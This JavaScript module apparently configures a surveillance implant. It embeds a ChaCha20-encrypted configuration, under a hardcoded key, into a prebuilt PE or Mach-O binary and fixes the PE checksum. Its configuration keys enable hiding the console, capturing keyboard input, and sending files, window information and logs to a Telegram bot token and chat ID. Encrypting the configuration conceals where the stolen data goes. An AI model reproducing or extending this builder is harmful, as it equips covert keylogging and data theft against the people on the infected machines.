const MAGIC = Uint8Array.from([
  0x43, 0x32, 0x54, 0x43, 0x46, 0x47, 0x00, 0xa7,
  0x31, 0xd5, 0x6c, 0x92, 0xe8, 0x4b, 0xf0, 0x1d,
]);

const VERSION = 2;
const HEADER_SIZE = 32;
const PAYLOAD_CAPACITY = 4096;
const REGION_SIZE = HEADER_SIZE + PAYLOAD_CAPACITY;

const CONFIG_KEY = new Uint8Array([
  0x53, 0x65, 0x63, 0x75, 0x72, 0x65, 0x43, 0x32,
  0x54, 0x50, 0x72, 0x6f, 0x74, 0x65, 0x63, 0x74,
  0x69, 0x6f, 0x6e, 0x4b, 0x65, 0x79, 0x56, 0x32,
  0x2e, 0x30, 0x5f, 0x8a, 0x19, 0xd4, 0xe2, 0x7b
]);

function rotl32(v, c) {
  return ((v << c) | (v >>> (32 - c))) >>> 0;
}

function chacha20Quarterround(state, a, b, c, d) {
  state[a] = (state[a] + state[b]) >>> 0;
  state[d] = rotl32(state[d] ^ state[a], 16);
  state[c] = (state[c] + state[d]) >>> 0;
  state[b] = rotl32(state[b] ^ state[c], 12);
  state[a] = (state[a] + state[b]) >>> 0;
  state[d] = rotl32(state[d] ^ state[a], 8);
  state[c] = (state[c] + state[d]) >>> 0;
  state[b] = rotl32(state[b] ^ state[c], 7);
}

function chacha20Block(key, counter, nonce) {
  const state = new Uint32Array(16);
  state[0] = 0x61707865;
  state[1] = 0x3330322d;
  state[2] = 0x79622d32;
  state[3] = 0x6b206574;
  const keyView = new DataView(key.buffer, key.byteOffset, key.byteLength);
  for (let i = 0; i < 8; i++) {
    state[4 + i] = keyView.getUint32(i * 4, true);
  }
  state[12] = counter >>> 0;
  const nonceView = new DataView(nonce.buffer, nonce.byteOffset, nonce.byteLength);
  state[13] = nonceView.getUint32(0, true);
  state[14] = nonceView.getUint32(4, true);
  state[15] = nonceView.getUint32(8, true);

  const working = new Uint32Array(state);
  for (let i = 0; i < 10; i++) {
    chacha20Quarterround(working, 0, 4, 8, 12);
    chacha20Quarterround(working, 1, 5, 9, 13);
    chacha20Quarterround(working, 2, 6, 10, 14);
    chacha20Quarterround(working, 3, 7, 11, 15);
    chacha20Quarterround(working, 0, 5, 10, 15);
    chacha20Quarterround(working, 1, 6, 11, 12);
    chacha20Quarterround(working, 2, 7, 8, 13);
    chacha20Quarterround(working, 3, 4, 9, 14);
  }

  const out = new Uint8Array(64);
  const outView = new DataView(out.buffer);
  for (let i = 0; i < 16; i++) {
    outView.setUint32(i * 4, (state[i] + working[i]) >>> 0, true);
  }
  return out;
}

export function chacha20Crypt(data, key, nonce, counter = 1) {
  const out = new Uint8Array(data.length);
  for (let offset = 0; offset < data.length; offset += 64) {
    const block = chacha20Block(key, counter + Math.floor(offset / 64), nonce);
    const chunkLen = Math.min(64, data.length - offset);
    for (let i = 0; i < chunkLen; i++) {
      out[offset + i] = data[offset + i] ^ block[i];
    }
  }
  return out;
}

export const FLAG_KEYS = new Set([
  "C2T_VERBOSE",
  "C2T_LOG_FILE",
  "C2T_AUTO_RESTART",
  "C2T_HIDE_CONSOLE",
  "HIDE_CONSOLE",
  "TELEGRAM_ENABLED",
  "TELEGRAM_DEDUPLICATE",
  "TELEGRAM_SEND_FILES",
  "TELEGRAM_SEND_WINDOW_INFO",
  "TELEGRAM_SEND_LOGS",
  "TELEGRAM_SEND_KEYBOARD",
  "C2T_DISABLE_KEYBOARD",
]);

export const SENSITIVE_KEYS = new Set([
  "TELEGRAM_BOT_TOKEN",
  "TELEGRAM_CHAT_ID",
]);

export const STRING_KEYS = new Set([
  "C2T_DAEMON_NAME",
  "C2T_SUPERVISOR_NAME",
]);

export const ALLOWED_KEYS = new Set([
  ...FLAG_KEYS,
  ...SENSITIVE_KEYS,
  ...STRING_KEYS,
  "TELEGRAM_LOG_INTERVAL_SEC",
  "TELEGRAM_MAX_FILE_BYTES",
  "C2T_QUEUE_MAX_BYTES",
  "C2T_QUEUE_MAX_ITEMS",
  "C2T_DELIVERY_ATTEMPTS",
  "C2T_RETRY_DELAY_MS",
  "C2T_KEYBOARD_FLUSH_MS",
]);

const SIZE_KEYS = new Set(
  [...ALLOWED_KEYS].filter(
    (key) => !FLAG_KEYS.has(key) && !SENSITIVE_KEYS.has(key) && !STRING_KEYS.has(key),
  ),
);

function writeUint32(view, offset, value) {
  view.setUint32(offset, value >>> 0, true);
}

export function crc32(bytes) {
  let crc = 0xffffffff;
  for (const byte of bytes) {
    crc ^= byte;
    for (let bit = 0; bit < 8; bit += 1) {
      crc = (crc >>> 1) ^ ((crc & 1) ? 0xedb88320 : 0);
    }
  }
  return (crc ^ 0xffffffff) >>> 0;
}

export function validateConfig(config) {
  const normalized = {};
  for (const [key, rawValue] of Object.entries(config)) {
    if (!ALLOWED_KEYS.has(key)) {
      throw new Error(`Unknown configuration key: ${key}`);
    }
    const value = String(rawValue);
    if (value.includes("\0") || value.includes("\n") || value.includes("\r")) {
      throw new Error(`${key} contains a forbidden character`);
    }
    if (FLAG_KEYS.has(key) && value !== "0" && value !== "1") {
      throw new Error(`${key} must be 0 or 1`);
    }
    if (SIZE_KEYS.has(key) && !/^[1-9][0-9]*$/.test(value)) {
      throw new Error(`${key} must be a positive decimal integer`);
    }
    if (STRING_KEYS.has(key) && !/^[a-zA-Z0-9_.-]{1,15}$/.test(value)) {
      throw new Error(`${key} must be 1-15 alphanumeric characters (_.- allowed)`);
    }
    const byteLength = new TextEncoder().encode(value).length;
    if (key === "TELEGRAM_BOT_TOKEN" && byteLength >= 512) {
      throw new Error("The Telegram bot token is too long");
    }
    if (key === "TELEGRAM_CHAT_ID" && byteLength >= 128) {
      throw new Error("The Telegram chat ID is too long");
    }
    normalized[key] = value;
  }
  return normalized;
}

export function encodePayload(config) {
  const normalized = validateConfig(config);
  const text = Object.keys(normalized)
    .sort()
    .map((key) => `${key}=${normalized[key]}\n`)
    .join("");
  const payload = new TextEncoder().encode(text);
  if (payload.length > PAYLOAD_CAPACITY) {
    throw new Error(
      `The configuration uses ${payload.length} bytes; the limit is ${PAYLOAD_CAPACITY}`,
    );
  }
  return payload;
}

export function locateRegion(binary) {
  const offsets = [];
  outer: for (let offset = 0; offset <= binary.length - MAGIC.length; offset += 1) {
    for (let index = 0; index < MAGIC.length; index += 1) {
      if (binary[offset + index] !== MAGIC[index]) continue outer;
    }
    offsets.push(offset);
  }
  if (offsets.length !== 1) {
    throw new Error(
      `Expected one c2t configuration region, found ${offsets.length}`,
    );
  }
  const offset = offsets[0];
  if (offset + REGION_SIZE > binary.length) {
    throw new Error("Truncated c2t configuration region");
  }
  const view = new DataView(binary.buffer, binary.byteOffset, binary.byteLength);
  const version = view.getUint32(offset + 16, true);
  if (version !== 1 && version !== 2) {
    throw new Error("Unsupported embedded configuration version");
  }
  return offset;
}

function peChecksumOffset(binary) {
  if (binary[0] !== 0x4d || binary[1] !== 0x5a) return null;
  if (binary.length < 0x40) throw new Error("Truncated PE DOS header");

  const view = new DataView(binary.buffer, binary.byteOffset, binary.byteLength);
  const peOffset = view.getUint32(0x3c, true);
  const optionalOffset = peOffset + 24;
  if (
    optionalOffset + 2 > binary.length ||
    binary[peOffset] !== 0x50 || binary[peOffset + 1] !== 0x45 ||
    binary[peOffset + 2] !== 0 || binary[peOffset + 3] !== 0
  ) {
    throw new Error("Invalid PE header");
  }

  const optionalMagic = view.getUint16(optionalOffset, true);
  let directoryCountOffset;
  let directoriesOffset;
  if (optionalMagic === 0x10b) {
    directoryCountOffset = optionalOffset + 92;
    directoriesOffset = optionalOffset + 96;
  } else if (optionalMagic === 0x20b) {
    directoryCountOffset = optionalOffset + 108;
    directoriesOffset = optionalOffset + 112;
  } else {
    throw new Error("Unsupported PE optional header");
  }

  if (directoryCountOffset + 4 > binary.length) {
    throw new Error("Truncated PE optional header");
  }
  if (view.getUint32(directoryCountOffset, true) > 4) {
    const certificateOffset = directoriesOffset + 4 * 8;
    if (certificateOffset + 8 > binary.length) {
      throw new Error("Truncated PE data directory");
    }
    if (
      view.getUint32(certificateOffset, true) !== 0 ||
      view.getUint32(certificateOffset + 4, true) !== 0
    ) {
      throw new Error("The PE file is signed; configure the unsigned binary instead");
    }
  }

  const checksumOffset = optionalOffset + 64;
  if (checksumOffset + 4 > binary.length) {
    throw new Error("Truncated PE checksum field");
  }
  return checksumOffset;
}

function peChecksum(binary, checksumOffset) {
  let checksum = 0;
  for (let offset = 0; offset < binary.length; offset += 2) {
    let word = 0;
    if (!(checksumOffset <= offset && offset < checksumOffset + 4)) {
      word = binary[offset];
      if (offset + 1 < binary.length) word |= binary[offset + 1] << 8;
    }
    checksum = (checksum & 0xffff) + word + (checksum >>> 16);
  }
  checksum = (checksum & 0xffff) + (checksum >>> 16);
  checksum = (checksum & 0xffff) + (checksum >>> 16);
  return ((checksum & 0xffff) + binary.length) >>> 0;
}

function rejectSignedMachO(binary) {
  if (
    binary.length < 4 || binary[0] !== 0xcf || binary[1] !== 0xfa ||
    binary[2] !== 0xed || binary[3] !== 0xfe
  ) return;
  if (binary.length < 32) throw new Error("Truncated 64-bit Mach-O header");
  const view = new DataView(binary.buffer, binary.byteOffset, binary.byteLength);
  const commandCount = view.getUint32(16, true);
  const commandsSize = view.getUint32(20, true);
  let commandOffset = 32;
  const commandEnd = commandOffset + commandsSize;
  if (commandEnd > binary.length) throw new Error("Truncated Mach-O load commands");
  for (let index = 0; index < commandCount; index += 1) {
    if (commandOffset + 8 > commandEnd) throw new Error("Truncated Mach-O load command");
    const command = view.getUint32(commandOffset, true);
    const commandSize = view.getUint32(commandOffset + 4, true);
    if (commandSize < 8 || commandOffset + commandSize > commandEnd) {
      throw new Error("Invalid Mach-O load command size");
    }
    if (command === 0x1d) {
      throw new Error("The Mach-O file is code signed; use a macOS sidecar configuration");
    }
    commandOffset += commandSize;
  }
}

export function patchBinary(input, config) {
  const binary = input instanceof Uint8Array ? input : new Uint8Array(input);
  rejectSignedMachO(binary);
  const offset = locateRegion(binary);
  const payload = encodePayload(config);
  const result = new Uint8Array(binary);
  result.fill(0, offset, offset + REGION_SIZE);
  result.set(MAGIC, offset);
  const view = new DataView(result.buffer, result.byteOffset, result.byteLength);
  writeUint32(view, offset + 16, VERSION);
  if (payload.length > 0) {
    const nonceSeed = (Math.floor(Math.random() * 0xfffffffe) + 1) >>> 0;
    const nonce = new Uint8Array(12);
    const nonceView = new DataView(nonce.buffer);
    nonceView.setUint32(0, nonceSeed, true);
    nonce.set(MAGIC.subarray(8, 16), 4);
    const ciphertext = chacha20Crypt(payload, CONFIG_KEY, nonce, 1);
    writeUint32(view, offset + 20, payload.length);
    writeUint32(view, offset + 24, crc32(payload));
    writeUint32(view, offset + 28, nonceSeed);
    result.set(ciphertext, offset + HEADER_SIZE);
  } else {
    writeUint32(view, offset + 20, 0);
    writeUint32(view, offset + 24, 0);
    writeUint32(view, offset + 28, 0);
  }

  const checksumOffset = peChecksumOffset(result);
  if (checksumOffset !== null) {
    writeUint32(view, checksumOffset, peChecksum(result, checksumOffset));
  }
  return result;
}
